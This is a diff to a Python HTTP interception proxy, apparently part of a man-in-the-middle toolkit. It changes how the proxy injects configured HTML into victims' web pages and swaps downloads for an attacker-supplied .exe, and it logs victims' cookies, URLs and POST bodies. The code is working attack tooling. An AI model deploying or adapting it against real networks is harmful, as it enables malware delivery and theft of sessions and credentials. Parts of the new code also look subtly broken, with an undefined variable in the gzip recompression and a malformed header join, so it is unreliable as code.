@@ -21,44 +21,19 @@ import select
 import zlib
 import BaseHTTPServer
 
+from servers.HTTP import RespondWithFile
 from utils import *
 
-def HandleGzip(Headers, Content, Payload):
-	if len(Content) > 5:
-		try:
-			unziped = zlib.decompress(Content, 16+zlib.MAX_WBITS)
-		except:
-			return False
+def InjectData(data, client, req_uri):
 
-		InjectPayload = Payload
-		Len = ''.join(re.findall('(?<=Content-Length: )[^\r\n]*', Headers))
-		HasBody = re.findall('(?<=<body)[^<]*', unziped)
+	# Serve the .exe if needed
+	if settings.Config.Serve_Always == True:
+		return RespondWithFile(client, settings.Config.Exe_Filename, settings.Config.Exe_DlName)
 
-		if HasBody:
-			print text("[PROXY] Injecting into HTTP Response: %s" % color(settings.Config.HTMLToServe, 3, 1))
+	# Serve the .exe if needed and client requested a .exe
+	if settings.Config.Serve_Exe == True and req_uri.endswith('.exe'):
+		return RespondWithFile(client, settings.Config.Exe_Filename, os.path.basename(req_uri))
 
-			Content = unziped.replace("<body", settings.Config.HTMLToServe +"\n<body")
-			ziped = zlib.compress(Content)
-			FinalLen = str(len(ziped))
-			Headers = Headers.replace("Content-Length: "+Len, "Content-Length: "+FinalLen)
-			return Headers+'\r\n\r\n'+ziped
-	
-	return False
-
-def InjectPage(data, client):
-	if settings.Config.Exec_Mode_On_Off:
-		if settings.Config.Exe_Filename.endswith('.exe'):
-			buffer1 = ServeAlwaysExeFile(Payload = ServeEXE(data,client,settings.Config.Exe_Filename),ContentDiFile=settings.Config.Exe_Filename)
-			buffer1.calculate()
-			return str(buffer1)
-		else:
-			buffer1 = ServeAlwaysNormalFile(Payload = ServeEXE(data,client,settings.Config.Exe_Filename))
-			buffer1.calculate()
-			return str(buffer1)
-	else:
-		return data
-
-def InjectData(data):
 	if len(data.split('\r\n\r\n')) > 1:
 		try:
 			Headers, Content = data.split('\r\n\r\n')
@@ -71,22 +46,30 @@ def InjectData(data):
 			return data
 
 		if "content-encoding: gzip" in Headers.lower():
-
-			Gzip = HandleGzip(Headers, Content, settings.Config.HTMLToServe)
-			return Gzip if Gzip else data
+			Content = zlib.decompress(Content, 16+zlib.MAX_WBITS)
 
 		if "content-type: text/html" in Headers.lower():
 
+			# Serve the custom HTML if needed
+			if settings.Config.Serve_Html == True:
+				return RespondWithFile(client, settings.Config.Html_Filename)
+
 			Len = ''.join(re.findall('(?<=Content-Length: )[^\r\n]*', Headers))
-			HasBody = re.findall('(?<=<body)[^<]*', Content)
-			
+			HasBody = re.findall('(<body[^>]*>)', Content)
+
 			if HasBody:
-				print text("[PROXY] Injecting into HTTP Response: %s" % color(settings.Config.HTMLToServe, 3, 1))
+				print text("[PROXY] Injecting into HTTP Response: %s" % color(settings.Config.HTMLToInject, 3, 1))
 
-				NewContent = Content.replace("<body", settings.Config.HTMLToServe +"\n<body")
-				Headers = Headers.replace("Content-Length: "+Len, "Content-Length: "+ str(len(NewContent)))
+				Content = Content.replace(HasBody[0], '%s\n%s' % (HasBody[0], settings.Config.HTMLToInject))
+				Headers = Headers.replace("Content-Length: "+Len, "Content-Length: "+ str(len(Content)))
 
-				return Headers+'\r\n\r\n'+NewContent
+		if "content-encoding: gzip" in Headers.lower():
+			Content = zlib.compress(lContent)
+
+		data = Headers +'\r\n'+ Content
+
+	#else:
+	#	print text("[PROXY] Returning unmodified HTTP response")
 
 	return data
 
@@ -185,10 +168,8 @@ class ProxySock:
 		return self.socket.recv_into(buffer, *args)
 	
 	def send(self, *args) :
-		try:
-			return self.socket.send(*args)
-		except:
-			pass
+		try: return self.socket.send(*args)
+		except: pass
 	
 	def sendall(self, *args) :
 		return self.socket.sendall(*args)
@@ -224,6 +205,7 @@ class HTTP_Proxy(BaseHTTPServer.BaseHTTPRequestHandler):
 
 	def handle(self):
 		(ip, port) =  self.client_address
+		print text("[PROXY] Received connection from %s" % self.client_address[0])
 		self.__base_handle()
 
 	def _connect_to(self, netloc, soc):
@@ -291,8 +273,8 @@ class HTTP_Proxy(BaseHTTPServer.BaseHTTPRequestHandler):
 
 				Cookie = self.headers['Cookie'] if "Cookie" in self.headers else ''
 
-				print text("[PROXY] Client        : %s" % color(self.client_address[0], 3, 0))
-				print text("[PROXY] Requested URL : %s" % color(self.path, 3, 0))
+				print text("[PROXY] Client        : %s" % color(self.client_address[0], 3))
+				print text("[PROXY] Requested URL : %s" % color(self.path, 3))
 				print text("[PROXY] Cookie        : %s" % Cookie)
 
 				self.headers['Connection'] = 'close'
@@ -302,8 +284,10 @@ class HTTP_Proxy(BaseHTTPServer.BaseHTTPRequestHandler):
 					soc.send("%s: %s\r\n" % key_val)
 				soc.send("\r\n")
 
-				try: self._read_write(soc, netloc)
-				except: pass
+				try:
+					self._read_write(soc, netloc)
+				except:
+					pass
 
 		finally:
 			soc.close()
@@ -322,18 +306,16 @@ class HTTP_Proxy(BaseHTTPServer.BaseHTTPRequestHandler):
 				for i in ins:
 					if i is soc:
 						out = self.connection
-						try:
-							data = i.recv(8192)
-							if len(settings.Config.HTMLToServe)>5:
-								data = InjectData(data)
-							else:
-								data = InjectPage(data,self.client_address[0])
-
-						except:
-							pass
+						#try:
+						data = i.recv(4096)
+						if len(data) > 1:
+							data = InjectData(data, self.client_address[0], self.path)
+						#except:
+						#	pass
 					else:
 						out = soc
-						data = i.recv(8192)
+						data = i.recv(4096)
+
 						if self.command == "POST":
 							print text("[PROXY] POST Data     : %s" % data)
 					if data:
